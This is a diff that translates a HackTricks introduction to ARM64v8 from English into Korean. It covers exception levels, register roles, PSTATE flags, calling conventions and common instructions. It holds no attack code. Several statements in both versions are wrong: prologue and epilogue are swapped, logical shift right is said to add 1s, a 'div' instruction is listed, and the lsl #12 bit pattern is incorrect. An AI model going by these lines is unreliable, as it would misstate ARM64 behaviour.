@@ -1,231 +1,231 @@
-# Introduction to ARM64v8
+# ARM64v8 소개
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 
 ## **Exception Levels - EL (ARM64v8)**
 
-In ARMv8 architecture, execution levels, known as Exception Levels (ELs), define the privilege level and capabilities of the execution environment. There are four exception levels, ranging from EL0 to EL3, each serving a different purpose:
+ARMv8 architecture에서 Exception Levels(EL)이라고 하는 execution level은 execution environment의 privilege level과 capabilities를 정의합니다. EL0부터 EL3까지 총 네 가지 exception level이 있으며, 각각 서로 다른 용도로 사용됩니다.
 
 1. **EL0 - User Mode**:
-- This is the least-privileged level and is used for executing regular application code.
-- Applications running at EL0 are isolated from each other and from the system software, enhancing security and stability.
+- 가장 낮은 privilege level이며 일반 application code를 실행하는 데 사용됩니다.
+- EL0에서 실행되는 application은 서로 격리되고 system software와도 분리되어 security와 stability가 향상됩니다.
 2. **EL1 - Operating System Kernel Mode**:
-- Most operating system kernels run at this level.
-- EL1 has more privileges than EL0 and can access system resources, but with some restrictions to ensure system integrity. You go from EL0 to EL1 with the SVC instruction.
+- 대부분의 operating system kernel은 이 level에서 실행됩니다.
+- EL1은 EL0보다 더 많은 privilege를 가지며 system resource에 access할 수 있지만, system integrity를 보장하기 위한 일부 제한이 있습니다. `SVC` instruction을 사용하면 EL0에서 EL1로 이동합니다.
 3. **EL2 - Hypervisor Mode**:
-- This level is used for virtualization. A hypervisor running at EL2 can manage multiple operating systems (each in its own EL1) running on the same physical hardware.
-- EL2 provides features for isolation and control of the virtualized environments.
-- So virtual machine applications like Parallels can use the `hypervisor.framework` to interact with EL2 and run virtual machines without needing kernel extensions.
-- TO move from EL1 to EL2 the `HVC` instruction is used.
+- 이 level은 virtualization에 사용됩니다. EL2에서 실행되는 hypervisor는 동일한 physical hardware에서 여러 operating system(각각 자체 EL1에서 실행)을 관리할 수 있습니다.
+- EL2는 virtualized environment의 isolation과 control을 위한 기능을 제공합니다.
+- 따라서 Parallels와 같은 virtual machine application은 `hypervisor.framework`를 사용해 EL2와 상호작용하고, kernel extension 없이 virtual machine을 실행할 수 있습니다.
+- EL1에서 EL2로 이동할 때는 `HVC` instruction을 사용합니다.
 4. **EL3 - Secure Monitor Mode**:
-- This is the most privileged level and is often used for secure booting and trusted execution environments.
-- EL3 can manage and control accesses between secure and non-secure states (such as secure boot, trusted OS, etc.).
-- It was use for KPP (Kernel Patch Protection) in macOS, but it's not used anymore.
-- EL3 is not used anymore by Apple.
-- The transition to EL3 is typically done using the `SMC` (Secure Monitor Call) instruction.
+- 가장 높은 privilege level이며 secure booting과 trusted execution environment에 주로 사용됩니다.
+- EL3는 secure state와 non-secure state 사이의 access를 관리하고 제어할 수 있습니다(예: secure boot, trusted OS 등).
+- macOS에서는 KPP(Kernel Patch Protection)에 사용되었지만 더 이상 사용되지 않습니다.
+- Apple은 더 이상 EL3를 사용하지 않습니다.
+- 일반적으로 EL3로의 transition에는 `SMC`(Secure Monitor Call) instruction이 사용됩니다.
 
-The use of these levels allows for a structured and secure way to manage different aspects of the system, from user applications to the most privileged system software. ARMv8's approach to privilege levels helps in effectively isolating different system components, thereby enhancing the security and robustness of the system.
+이러한 level을 사용하면 user application부터 가장 높은 privilege를 가진 system software까지 system의 여러 측면을 구조적이고 안전하게 관리할 수 있습니다. ARMv8의 privilege level 방식은 서로 다른 system component를 효과적으로 격리하여 system의 security와 robustness를 향상시킵니다.
 
 ## **Registers (ARM64v8)**
 
-ARM64 has **31 general-purpose registers**, labeled `x0` through `x30`. Each can store a **64-bit** (8-byte) value. For operations that require only 32-bit values, the same registers can be accessed in a 32-bit mode using the names w0 through w30.
+ARM64에는 `x0`부터 `x30`까지 이름이 지정된 **31개의 general-purpose register**가 있습니다. 각 register는 **64비트**(8바이트) 값을 저장할 수 있습니다. 32비트 값만 필요한 operation에서는 같은 register를 w0부터 w30이라는 이름으로 32비트 mode에서 access할 수 있습니다.
 
-1. **`x0`** to **`x7`** - These are typically used as scratch registers and for passing parameters to subroutines.
-- **`x0`** also carries the return data of a function
-2. **`x8`** - In the Linux kernel, `x8` is used as the system call number for the `svc` instruction. **In macOS the x16 is the one used!**
-3. **`x9`** to **`x15`** - More temporary registers, often used for local variables.
-4. **`x16`** and **`x17`** - **Intra-procedural Call Registers**. Temporary registers for immediate values. They are also used for indirect function calls and PLT (Procedure Linkage Table) stubs.
-- **`x16`** is used as the **system call number** for the **`svc`** instruction in **macOS**.
-5. **`x18`** - **Platform register**. It can be used as a general-purpose register, but on some platforms, this register is reserved for platform-specific uses: Pointer to current thread environment block in Windows, or to point to the currently **executing task structure in linux kernel**.
-6. **`x19`** to **`x28`** - These are callee-saved registers. A function must preserve these registers' values for its caller, so they are stored in the stack and recovered before going back to the caller.
-7. **`x29`** - **Frame pointer** to keep track of the stack frame. When a new stack frame is created because a function is called, the **`x29`** register is **stored in the stack** and the **new** frame pointer address is (**`sp`** address) is **stored in this registry**.
-- This register can also be used as a **general-purpose registry** although it's usually used as reference to **local variables**.
-8. **`x30`** or **`lr`**- **Link register** . It holds the **return address** when a `BL` (Branch with Link) or `BLR` (Branch with Link to Register) instruction is executed by storing the **`pc`** value in this register.
-- It could also be used like any other register.
-- If the current function is going to call a new function and therefore overwrite `lr`, it will store it in the stack at the beginning, this is the epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) and recover it at the end, this is the prologue (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return).
-9. **`sp`** - **Stack pointer**, used to keep track of the top of the stack.
-- the **`sp`** value should always be kept to at least a **quadword** **alignment** or a alignment exception may occur.
-10. **`pc`** - **Program counter**, which points to the next instruction. This register can only be updates through exception generations, exception returns, and branches. The only ordinary instructions that can read this register are branch with link instructions (BL, BLR) to store the **`pc`** address in **`lr`** (Link Register).
-11. **`xzr`** - **Zero register**. Also called **`wzr`** in it **32**-bit register form. Can be used to get the zero value easily (common operation) or to perform comparisons using **`subs`** like **`subs XZR, Xn, #10`** storing the resulting data nowhere (in **`xzr`**).
+1. **`x0`**~**`x7`** - 일반적으로 scratch register와 subroutine에 parameter를 전달하는 용도로 사용됩니다.
+- **`x0`**는 function의 return data도 전달합니다.
+2. **`x8`** - Linux kernel에서는 `svc` instruction의 system call number로 `x8`을 사용합니다. **macOS에서는 x16을 사용합니다!**
+3. **`x9`**~**`x15`** - 추가 temporary register이며, local variable에 자주 사용됩니다.
+4. **`x16`** 및 **`x17`** - **Intra-procedural Call Register**입니다. immediate value를 위한 temporary register입니다. indirect function call과 PLT(Procedure Linkage Table) stub에도 사용됩니다.
+- macOS에서는 **`x16`**이 **`svc`** instruction의 **system call number**로 사용됩니다.
+5. **`x18`** - **Platform register**입니다. general-purpose register로 사용할 수도 있지만 일부 platform에서는 platform-specific 용도로 예약됩니다. 예를 들어 Windows에서는 current thread environment block의 pointer로, Linux kernel에서는 현재 **executing task structure**를 가리키는 용도로 사용됩니다.
+6. **`x19`**~**`x28`** - callee-saved register입니다. function은 caller를 위해 이 register의 값을 보존해야 하므로 stack에 저장한 뒤 caller로 돌아가기 전에 복구합니다.
+7. **`x29`** - stack frame을 추적하는 **Frame pointer**입니다. function 호출로 새로운 stack frame이 생성되면 **`x29`** register를 **stack에 저장**하고, **새로운** frame pointer address(**`sp` address**)를 이 register에 저장합니다.
+- 이 register는 **general-purpose register**로도 사용할 수 있지만, 일반적으로 **local variable**의 reference로 사용됩니다.
+8. **`x30`** 또는 **`lr`** - **Link register**입니다. `BL`(Branch with Link) 또는 `BLR`(Branch with Link to Register) instruction이 실행될 때 **`pc`** 값을 이 register에 저장하여 **return address**를 보관합니다.
+- 다른 register와 마찬가지로 사용할 수도 있습니다.
+- 현재 function이 새로운 function을 호출하여 `lr`을 덮어쓸 예정이라면 시작 부분에서 이를 stack에 저장합니다. 이것이 epilogue입니다(`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp`와 `lr`을 저장하고 공간을 할당한 뒤 새로운 `fp`를 설정). 마지막에는 이를 복구합니다. 이것이 prologue입니다(`ldp x29, x30, [sp], #48; ret` -> `fp`와 `lr`을 복구하고 return).
+9. **`sp`** - **Stack pointer**이며 stack의 top을 추적하는 데 사용됩니다.
+- **`sp`** 값은 항상 최소한 **quadword** 단위로 **alignment**되어야 하며, 그렇지 않으면 alignment exception이 발생할 수 있습니다.
+10. **`pc`** - **Program counter**이며 다음 instruction을 가리킵니다. 이 register는 exception generation, exception return 및 branch를 통해서만 update할 수 있습니다. 이 register를 읽을 수 있는 유일한 일반 instruction은 branch with link instruction(BL, BLR)이며, **`pc`** address를 **`lr`**(Link Register)에 저장하는 데 사용됩니다.
+11. **`xzr`** - **Zero register**입니다. **32**비트 register 형식에서는 **`wzr`**이라고도 합니다. zero value를 쉽게 얻거나(일반적인 operation), **`subs`**를 사용한 comparison을 수행할 때 사용할 수 있습니다. 예: `subs XZR, Xn, #10`은 결과 data를 어디에도 저장하지 않습니다(**`xzr`**에 저장).
 
-The **`Wn`** registers are the **32bit** version of the **`Xn`** register.
+**`Wn`** register는 **`Xn`** register의 **32비트** 버전입니다.
 
 > [!TIP]
-> The registers from X0 - X18 are volatile, which means that their values can be changed by function calls and interrupts. However, the registers from X19 - X28 are non-volatile, meaning their values must be preserved across function calls ("callee saved").
+> X0~X18 register는 volatile합니다. 즉 function call과 interrupt에 의해 값이 변경될 수 있습니다. 반면 X19~X28 register는 non-volatile하므로 function call 전후로 값이 보존되어야 합니다("callee saved").
 
-### SIMD and Floating-Point Registers
+### SIMD 및 Floating-Point Registers
 
-Moreover, there are another **32 registers of 128bit length** that can be used in optimized single instruction multiple data (SIMD) operations and for performing floating-point arithmetic. These are called the Vn registers although they can also operate in **64**-bit, **32**-bit, **16**-bit and **8**-bit and then they are called **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** and **`Bn`**.
+또한 optimized single instruction multiple data(SIMD) operation과 floating-point arithmetic에 사용할 수 있는 **128비트 길이의 register가 32개 더 있습니다**. 이를 Vn register라고 하며, **64**비트, **32**비트, **16**비트 및 **8**비트로도 동작할 수 있습니다. 이때 각각 **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** 및 **`Bn`**이라고 합니다.
 
 ### System Registers
 
-**There are hundreds of system registers**, also called special-purpose registers (SPRs), are used for **monitoring** and **controlling** **processors** behaviour.\
-They can only be read or set using the dedicated special instruction **`mrs`** and **`msr`**.
+**수백 개의 system register**가 있으며, special-purpose register(SPR)라고도 합니다. 이 register는 **processor**의 동작을 **monitoring**하고 **controlling**하는 데 사용됩니다.\
+전용 special instruction인 **`mrs`**와 **`msr`**를 통해서만 읽거나 설정할 수 있습니다.
 
-The special registers **`TPIDR_EL0`** and **`TPIDDR_EL0`** are commonly found when reversing engineering. The `EL0` suffix indicates the **minimal exception** from which the register can be accessed (in this case EL0 is the regular exception (privilege) level regular programs runs with).\
-They are often used to store the **base address of the thread-local storage** region of memory. Usually the first one is readable and writable for programs running in EL0, but the second can be read from EL0 and written from EL1 (like kernel).
+special register인 **`TPIDR_EL0`**과 **`TPIDDR_EL0`**은 reverse engineering에서 자주 발견됩니다. `EL0` suffix는 해당 register에 access할 수 있는 **최소 exception level**을 나타냅니다(이 경우 EL0은 일반 program이 실행되는 regular exception(privilege) level입니다).\
+이 register는 memory의 **thread-local storage** 영역에 대한 **base address**를 저장하는 데 자주 사용됩니다. 일반적으로 첫 번째 register는 EL0에서 실행되는 program이 읽고 쓸 수 있지만, 두 번째 register는 EL0에서 읽을 수 있고 EL1(예: kernel)에서 쓸 수 있습니다.
 
 - `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
 - `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`
 
 ### **PSTATE**
 
-**PSTATE** contains several process components serialized into the operating-system-visible **`SPSR_ELx`** special register, being X the **permission** **level of the triggered** exception (this allows to recover the process state when the exception ends).\
-These are the accessible fields:
+**PSTATE**에는 여러 process component가 포함되어 있으며, 이 값은 operating-system-visible **`SPSR_ELx`** special register에 serialize됩니다. 여기서 X는 trigger된 exception의 **permission** **level**이며, exception이 종료될 때 process state를 복구할 수 있게 합니다.\
+다음 field에 access할 수 있습니다.
 
 <figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>
 
-- The **`N`**, **`Z`**, **`C`** and **`V`** condition flags:
-- **`N`** means the operation yielded a negative result
-- **`Z`** means the operation yielded zero
-- **`C`** means the operation carried
-- **`V`** means the operation yielded a signed overflow:
-- The sum of two positive numbers yields a negative result.
-- The sum of two negative numbers yields a positive result.
-- In subtraction, when a large negative number is subtracted from a smaller positive number (or vice versa), and the result cannot be represented within the range of the given bit size.
-- Obviously the processor doesn't now the operation is signed or not, so it will check C and V in the operations and indicate of a carry occurred in case it was signed or unsigned.
+- **`N`**, **`Z`**, **`C`**, **`V`** condition flag:
+- **`N`**은 operation 결과가 음수임을 의미합니다.
+- **`Z`**는 operation 결과가 0임을 의미합니다.
+- **`C`**는 operation에서 carry가 발생했음을 의미합니다.
+- **`V`**는 operation에서 signed overflow가 발생했음을 의미합니다.
+- 두 positive number의 합이 negative result가 되는 경우
+- 두 negative number의 합이 positive result가 되는 경우
+- subtraction에서 큰 negative number를 더 작은 positive number에서 빼거나(또는 반대의 경우) 결과가 주어진 bit size의 범위 내에서 표현될 수 없는 경우
+- processor는 operation이 signed인지 unsigned인지 알 수 없으므로 operation에서 C와 V를 확인하고, signed 또는 unsigned operation에서 carry가 발생했는지 표시합니다.
 
 > [!WARNING]
-> Not all the instructions update these flags. Some like **`CMP`** or **`TST`** do, and others that have an s suffix like **`ADDS`** also do it.
+> 모든 instruction이 이 flag를 update하는 것은 아닙니다. **`CMP`**나 **`TST`**와 같은 instruction은 update하며, `ADDS`처럼 s suffix가 있는 instruction도 update합니다.
 
-- The current **register width (`nRW`) flag**: If the flag holds the value 0, the program will run in the AArch64 execution state once resumed.
-- The current **Exception Level** (**`EL`**): A regular program running in EL0 will have the value 0
-- The **single stepping** flag (**`SS`**): Used by debuggers to single step by setting the SS flag to 1 inside **`SPSR_ELx`** through an exception. The program will run a step and issue a single step exception.
-- The **illegal exception** state flag (**`IL`**): It's used to mark when a privileged software performs an invalid exception level transfer, this flag is set to 1 and the processor triggers an illegal state exception.
-- The **`DAIF`** flags: These flags allow a privileged program to selectively mask certain external exceptions.
-- If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).
-- The **stack pointer select** flags (**`SPS`**): Privileged programs running in EL1 and above can swap between using their own stack pointer register and the user-model one (e.g. between `SP_EL1` and `EL0`). This switching is performed by writing to the **`SPSel`** special register. This cannot be done from EL0.
+- 현재 **register width(`nRW`) flag**: flag 값이 0이면 program은 resume된 후 AArch64 execution state에서 실행됩니다.
+- 현재 **Exception Level**(**`EL`**): EL0에서 실행되는 일반 program의 값은 0입니다.
+- **single stepping** flag(**`SS`**): debugger가 exception을 통해 **`SPSR_ELx`** 내부의 SS flag를 1로 설정하여 single step을 수행하는 데 사용됩니다. program은 한 step을 실행한 뒤 single step exception을 발생시킵니다.
+- **illegal exception** state flag(**`IL`**): privileged software가 invalid exception level transfer를 수행했을 때 표시하는 데 사용됩니다. 이 flag가 1로 설정되고 processor는 illegal state exception을 trigger합니다.
+- **`DAIF`** flag: privileged program이 특정 external exception을 선택적으로 mask할 수 있게 합니다.
+- **`A`**가 1이면 **asynchronous abort**가 trigger됩니다. **`I`**는 external hardware **Interrupt Request**(IRQ)에 응답할지 설정합니다. F는 **Fast Interrupt Request**(FIR)와 관련됩니다.
+- **stack pointer select** flag(**`SPS`**): EL1 이상에서 실행되는 privileged program은 자체 stack pointer register와 user-model stack pointer 사이에서 전환할 수 있습니다(예: `SP_EL1`과 `EL0` 사이). 이 전환은 **`SPSel`** special register에 write하여 수행합니다. EL0에서는 수행할 수 없습니다.
 
 ## **Calling Convention (ARM64v8)**
 
-The ARM64 calling convention specifies that the **first eight parameters** to a function are passed in registers **`x0` through `x7`**. **Additional** parameters are passed on the **stack**. The **return** value is passed back in register **`x0`**, or in **`x1`** as well **if its 128 bits long**. The **`x19`** to **`x30`** and **`sp`** registers must be **preserved** across function calls.
+ARM64 calling convention에서는 function의 **첫 8개 parameter**를 **`x0`**~**`x7`** register로 전달합니다. 추가 parameter는 **stack**으로 전달됩니다. **return** value는 **`x0`** register로 전달되며, **128비트 길이인 경우**에는 **`x1`**도 함께 사용됩니다. **`x19`**~**`x30`** 및 **`sp`** register는 function call 전후로 **보존되어야 합니다**.
 
-When reading a function in assembly, look for the **function prologue and epilogue**. The **prologue** usually involves **saving the frame pointer (`x29`)**, **setting** up a **new frame pointer**, and a**llocating stack space**. The **epilogue** usually involves **restoring the saved frame pointer** and **returning** from the function.
+assembly에서 function을 읽을 때는 **function prologue와 epilogue**를 확인해야 합니다. **prologue**는 일반적으로 **frame pointer(`x29`)를 저장**하고, **새 frame pointer를 설정**하며, **stack space를 할당**합니다. **epilogue**는 일반적으로 저장된 frame pointer를 **복구**하고 function에서 **return**합니다.
 
-### Calling Convention in Swift
+### Swift의 Calling Convention
 
-Swift have its own **calling convention** that can be found in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
+Swift에는 자체 **calling convention**이 있으며 [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)에서 확인할 수 있습니다.
 
 ## **Common Instructions (ARM64v8)**
 
-ARM64 instructions generally have the **format `opcode dst, src1, src2`**, where **`opcode`** is the **operation** to be performed (such as `add`, `sub`, `mov`, etc.), **`dst`** is the **destination** register where the result will be stored, and **`src1`** and **`src2`** are the **source** registers. Immediate values can also be used in place of source registers.
+ARM64 instruction은 일반적으로 **`opcode dst, src1, src2`** 형식을 사용합니다. 여기서 **`opcode`**는 수행할 operation(`add`, `sub`, `mov` 등)이고, **`dst`**는 결과를 저장할 **destination** register이며, **`src1`**과 **`src2`**는 **source** register입니다. source register 대신 immediate value를 사용할 수도 있습니다.
 
-- **`mov`**: **Move** a value from one **register** to another.
-- Example: `mov x0, x1` — This moves the value from `x1` to `x0`.
-- **`ldr`**: **Load** a value from **memory** into a **register**.
-- Example: `ldr x0, [x1]` — This loads a value from the memory location pointed to by `x1` into `x0`.
-- **Offset mode**: An offset affecting the orin pointer is indicated, for example:
-- `ldr x2, [x1, #8]`, this will load in x2 the value from x1 + 8
-- `ldr x2, [x0, x1, lsl #2]`, this will load in x2 an object from the array x0, from the position x1 (index) \* 4
-- **Pre-indexed mode**: This will apply calculations to the origin, get the result and also store the new origin in the origin.
-- `ldr x2, [x1, #8]!`, this will load `x1 + 8` in `x2` and store in x1 the result of `x1 + 8`
-- `str lr, [sp, #-4]!`, Store the link register in sp and update the register sp
-- **Post-index mode**: This is like the previous one but the memory address is accessed and then the offset is calculated and stored.
-- `ldr x0, [x1], #8`, load `x1` in `x0` and update x1 with `x1 + 8`
-- **PC-relative addressing**: In this case the address to load is calculated relative to the PC register
-- `ldr x1, =_start`, This will load the address where the `_start` symbol starts in x1 related to the current PC.
-- **`str`**: **Store** a value from a **register** into **memory**.
-- Example: `str x0, [x1]` — This stores the value in `x0` into the memory location pointed to by `x1`.
-- **`ldp`**: **Load Pair of Registers**. This instruction **loads two registers** from **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
-- Example: `ldp x0, x1, [x2]` — This loads `x0` and `x1` from the memory locations at `x2` and `x2 + 8`, respectively.
-- **`stp`**: **Store Pair of Registers**. This instruction **stores two registers** to **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
-- Example: `stp x0, x1, [sp]` — This stores `x0` and `x1` to the memory locations at `sp` and `sp + 8`, respectively.
-- `stp x0, x1, [sp, #16]!` — This stores `x0` and `x1` to the memory locations at `sp+16` and `sp + 24`, respectively, and updates `sp` with `sp+16`.
-- **`add`**: **Add** the values of two registers and store the result in a register.
+- **`mov`**: 한 **register**의 값을 다른 register로 **이동**합니다.
+- 예: `mov x0, x1` — `x1`의 값을 `x0`으로 이동합니다.
+- **`ldr`**: **memory**의 값을 **register**로 **load**합니다.
+- 예: `ldr x0, [x1]` — `x1`이 가리키는 memory location의 값을 `x0`으로 load합니다.
+- **Offset mode**: origin pointer에 영향을 주는 offset을 지정합니다. 예:
+- `ldr x2, [x1, #8]`은 `x1 + 8`의 값을 x2에 load합니다.
+- `ldr x2, [x0, x1, lsl #2]`는 array x0에서 x1(index) 위치의 object를 x2에 load합니다(index \* 4).
+- **Pre-indexed mode**: origin에 calculation을 적용하고, 결과를 얻은 뒤 새로운 origin을 origin에 저장합니다.
+- `ldr x2, [x1, #8]!`은 `x1 + 8`을 `x2`에 load하고, `x1`에 `x1 + 8`의 결과를 저장합니다.
+- `str lr, [sp, #-4]!`는 link register를 sp에 저장하고 sp register를 update합니다.
+- **Post-index mode**: 이전 mode와 유사하지만 memory address에 access한 후 offset을 계산하고 저장합니다.
+- `ldr x0, [x1], #8`은 `x1`을 `x0`에 load하고 x1을 `x1 + 8`로 update합니다.
+- **PC-relative addressing**: 이 경우 load할 address는 PC register를 기준으로 계산됩니다.
+- `ldr x1, =_start`는 현재 PC를 기준으로 `_start` symbol이 시작하는 address를 x1에 load합니다.
+- **`str`**: **register**의 값을 **memory**에 **store**합니다.
+- 예: `str x0, [x1]` — `x0`의 값을 `x1`이 가리키는 memory location에 store합니다.
+- **`ldp`**: **Load Pair of Registers**입니다. 이 instruction은 **연속된 memory** location에서 두 register를 **load**합니다. memory address는 일반적으로 다른 register의 값에 offset을 더해 구성합니다.
+- 예: `ldp x0, x1, [x2]` — `x2`와 `x2 + 8`의 memory location에서 각각 `x0`과 `x1`을 load합니다.
+- **`stp`**: **Store Pair of Registers**입니다. 이 instruction은 두 register를 **연속된 memory** location에 **store**합니다. memory address는 일반적으로 다른 register의 값에 offset을 더해 구성합니다.
+- 예: `stp x0, x1, [sp]` — `x0`과 `x1`을 각각 `sp`와 `sp + 8`의 memory location에 store합니다.
+- `stp x0, x1, [sp, #16]!` — `x0`과 `x1`을 각각 `sp+16`과 `sp + 24`의 memory location에 store하고, `sp`를 `sp+16`으로 update합니다.
+- **`add`**: 두 register의 값을 **더하고** 결과를 register에 저장합니다.
 - Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
 - Xn1 -> Destination
 - Xn2 -> Operand 1
-- Xn3 | #imm -> Operando 2 (register or immediate)
-- \[shift #N | RRX] -> Perform a shift or call RRX
-- Example: `add x0, x1, x2` — This adds the values in `x1` and `x2` together and stores the result in `x0`.
-- `add x5, x5, #1, lsl #12` — This equals to 4096 (a 1 shifter 12 times) -> 1 0000 0000 0000 0000
-- **`adds`** This perform an `add` and updates the flags
-- **`sub`**: **Subtract** the values of two registers and store the result in a register.
-- Check **`add`** **syntax**.
-- Example: `sub x0, x1, x2` — This subtracts the value in `x2` from `x1` and stores the result in `x0`.
-- **`subs`** This is like sub but updating the flag
-- **`mul`**: **Multiply** the values of **two registers** and store the result in a register.
-- Example: `mul x0, x1, x2` — This multiplies the values in `x1` and `x2` and stores the result in `x0`.
-- **`div`**: **Divide** the value of one register by another and store the result in a register.
-- Example: `div x0, x1, x2` — This divides the value in `x1` by `x2` and stores the result in `x0`.
+- Xn3 | #imm -> Operand 2(register 또는 immediate)
+- \[shift #N | RRX] -> shift를 수행하거나 RRX를 호출합니다.
+- 예: `add x0, x1, x2` — `x1`과 `x2`의 값을 더해 결과를 `x0`에 저장합니다.
+- `add x5, x5, #1, lsl #12` — 이는 4096과 같습니다(1을 12번 shift) -> 1 0000 0000 0000 0000
+- **`adds`**: `add`를 수행하고 flag를 update합니다.
+- **`sub`**: 두 register의 값을 **빼고** 결과를 register에 저장합니다.
+- **`add`** **syntax**를 참조하십시오.
+- 예: `sub x0, x1, x2` — `x1`에서 `x2`의 값을 빼고 결과를 `x0`에 저장합니다.
+- **`subs`**: `sub`과 같지만 flag를 update합니다.
+- **`mul`**: **두 register**의 값을 **곱하고** 결과를 register에 저장합니다.
+- 예: `mul x0, x1, x2` — `x1`과 `x2`의 값을 곱해 결과를 `x0`에 저장합니다.
+- **`div`**: 한 register의 값을 다른 register의 값으로 **나누고** 결과를 register에 저장합니다.
+- 예: `div x0, x1, x2` — `x1`의 값을 `x2`로 나누고 결과를 `x0`에 저장합니다.
 - **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
-- **Logical shift left**: Add 0s from the end moving the other bits forward (multiply by n-times 2)
-- **Logical shift right**: Add 1s at the beginning moving the other bits backward (divide by n-times 2 in unsigned)
-- **Arithmetic shift right**: Like **`lsr`**, but instead of adding 0s if the most significant bit is a 1, **1s are added (**divide by ntimes 2 in signed)
-- **Rotate right**: Like **`lsr`** but whatever is removed from the right it's appended to the left
-- **Rotate Right with Extend**: Like **`ror`**, but with the carry flag as the "most significant bit". So the carry flag is moved to the bit 31 and the removed bit to the carry flag.
-- **`bfm`**: **Bit Filed Move**, these operations **copy bits `0...n`** from a value an place them in positions **`m..m+n`**. The **`#s`** specifies the **leftmost bit** position and **`#r`** the **rotate right amount**.
-- Bitfiled move: `BFM Xd, Xn, #r`
+- **Logical shift left**: 끝에서 0을 추가하고 다른 bit를 앞으로 이동합니다(2를 n번 곱하는 것).
+- **Logical shift right**: 앞에 1을 추가하고 다른 bit를 뒤로 이동합니다(unsigned에서 2를 n번 나누는 것).
+- **Arithmetic shift right**: **`lsr`**과 같지만 최상위 bit가 1인 경우 0 대신 **1**을 추가합니다(signed에서 2를 n번 나누는 것).
+- **Rotate right**: **`lsr`**과 같지만 오른쪽에서 제거된 bit를 왼쪽에 추가합니다.
+- **Rotate Right with Extend**: **`ror`**와 같지만 carry flag가 "최상위 bit"로 사용됩니다. carry flag를 bit 31로 이동하고 제거된 bit를 carry flag로 이동합니다.
+- **`bfm`**: **Bit Field Move**입니다. 이 operation은 값에서 **bit `0...n`**을 복사해 **`m..m+n`** 위치에 배치합니다. **`#s`**는 **leftmost bit** position을, **`#r`**은 rotate right 양을 지정합니다.
+- Bitfield move: `BFM Xd, Xn, #r`
 - Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
 - Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
-- **Bitfield Extract and Insert:** Copy a bitfield from a register and copies it to another register.
-- **`BFI X1, X2, #3, #4`** Insert 4 bits from X2 from the 3rd bit of X1
-- **`BFXIL X1, X2, #3, #4`** Extract from the 3rd bit of X2 four bits and copy them to X1
-- **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
-- **`SBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2, sign extends them, and places the result in X1
-- **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
-- **`UBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2 and places the zero-extended result in X1.
-- **Sign Extend To X:** Extends the sign (or adds just 0s in the unsigned version) of a value to be able to perform operations with it:
-- **`SXTB X1, W2`** Extends the sign of a byte **from W2 to X1** (`W2` is half of `X2`) to fill the 64bits
-- **`SXTH X1, W2`** Extends the sign of a 16bit number **from W2 to X1** to fill the 64bits
-- **`SXTW X1, W2`** Extends the sign of a byte **from W2 to X1** to fill the 64bits
-- **`UXTB X1, W2`** Adds 0s (unsigned) to a byte **from W2 to X1** to fill the 64bits
-- **`extr`:** Extracts bits from a specified **pair of registers concatenated**.
-- Example: `EXTR W3, W2, W1, #3` This will **concat W1+W2** and get **from bit 3 of W2 up to bit 3 of W1** and store it in W3.
-- **`cmp`**: **Compare** two registers and set condition flags. It's an **alias of `subs`** setting the destination register to the zero register. Useful to know if `m == n`.
-- It supports the **same syntax as `subs`**
-- Example: `cmp x0, x1` — This compares the values in `x0` and `x1` and sets the condition flags accordingly.
-- **`cmn`**: **Compare negative** operand. In this case it's an **alias of `adds`** and supports the same syntax. Useful to know if `m == -n`.
-- **`ccmp`**: Conditional comparison, it's a comparison that will be performed only if a previous comparison was true and will specifically set nzcv bits.
-- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> if x1 != x2 and x3 < x4, jump to func
-- This is because **`ccmp`** will only be executed if the **previous `cmp` was a `NE`**, if it wasn't the bits `nzcv` will be set to 0 (which won't satisfy the `blt` comparison).
-- This ca also be used as `ccmn` (same but negative, like `cmp` vs `cmn`).
-- **`tst`**: It checks if any of the values of the comparison are both 1 (it works like and ANDS without storing the result anywhere). It's useful to check a registry with a value and check if any of the bits of the registry indicated in the value is 1.
-- Example: `tst X1, #7` Check if any of the last 3 bits of X1 is 1
-- **`teq`**: XOR operation discarding the result
+- **Bitfield Extract and Insert:** register에서 bitfield를 복사해 다른 register에 복사합니다.
+- **`BFI X1, X2, #3, #4`** X2에서 4 bit를 가져와 X1의 3번째 bit부터 삽입합니다.
+- **`BFXIL X1, X2, #3, #4`** X2의 3번째 bit부터 4 bit를 추출해 X1에 복사합니다.
+- **`SBFIZ X1, X2, #3, #4`** X2에서 4 bit를 sign-extend하고 X1의 bit position 3부터 삽입하며 오른쪽 bit를 0으로 설정합니다.
+- **`SBFX X1, X2, #3, #4`** X2의 bit 3부터 4 bit를 추출하고 sign-extend한 뒤 결과를 X1에 배치합니다.
+- **`UBFIZ X1, X2, #3, #4`** X2에서 4 bit를 zero-extend하고 X1의 bit position 3부터 삽입하며 오른쪽 bit를 0으로 설정합니다.
